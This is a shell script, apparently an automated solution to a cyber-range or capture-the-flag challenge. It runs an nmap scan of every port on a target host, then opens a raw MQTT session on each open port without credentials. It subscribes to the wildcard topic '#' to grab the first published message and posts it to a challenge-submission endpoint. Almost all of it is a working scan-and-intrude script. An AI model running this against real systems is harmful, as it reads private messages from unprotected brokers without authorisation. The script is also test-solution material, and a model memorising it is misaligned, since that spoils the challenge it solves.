#!/bin/sh
set -eu

ports=$(nmap -Pn -n -sT -p- --open -T4 -oG - 172.20.0.141 | python3 -c 'import re,sys; print(" ".join(re.findall(r"(\d+)/open", sys.stdin.read())))')
flag=$(python3 - "$ports" <<'PY'
import socket
import struct
import sys


def encode_length(length):
    result = bytearray()
    while True:
        digit = length % 128
        length //= 128
        if length:
            digit |= 128
        result.append(digit)
        if not length:
            return bytes(result)


def packet(header, body):
    return bytes((header,)) + encode_length(len(body)) + body


def read_exact(sock, count):
    result = bytearray()
    while len(result) < count:
        part = sock.recv(count - len(result))
        if not part:
            raise RuntimeError("connection closed")
        result.extend(part)
    return bytes(result)


def read_packet(sock):
    header = read_exact(sock, 1)[0]
    multiplier = 1
    length = 0
    for _ in range(4):
        digit = read_exact(sock, 1)[0]
        length += (digit & 127) * multiplier
        if digit < 128:
            break
        multiplier *= 128
    else:
        raise RuntimeError("invalid packet length")
    return header, read_exact(sock, length)


for port_text in sys.argv[1].split():
    try:
        with socket.create_connection(("172.20.0.141", int(port_text)), timeout=2) as sock:
            sock.settimeout(2)
            client_id = b"range-solver"
            connect_body = b"\x00\x04MQTT\x04\x02\x00\x3c" + struct.pack("!H", len(client_id)) + client_id
            sock.sendall(packet(0x10, connect_body))
            if read_packet(sock) != (0x20, b"\x00\x00"):
                continue
            topic_filter = b"#"
            subscribe_body = b"\x00\x01" + struct.pack("!H", len(topic_filter)) + topic_filter + b"\x00"
            sock.sendall(packet(0x82, subscribe_body))
            while True:
                kind, body = read_packet(sock)
                if kind >> 4 == 3:
                    topic_size = struct.unpack("!H", body[:2])[0]
                    value = body[2 + topic_size:].decode("utf-8")
                    if value:
                        print(value)
                        sys.exit(0)
    except (OSError, RuntimeError, IndexError, struct.error):
        continue
raise SystemExit("No matching service response found")
PY
)
payload=$(python3 -c 'import json,sys; print(json.dumps({"challenge_id":"scl-challenge-frame-ae63e3","task_id":"task1","flag":sys.argv[1]}))' "$flag")
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary "$payload"
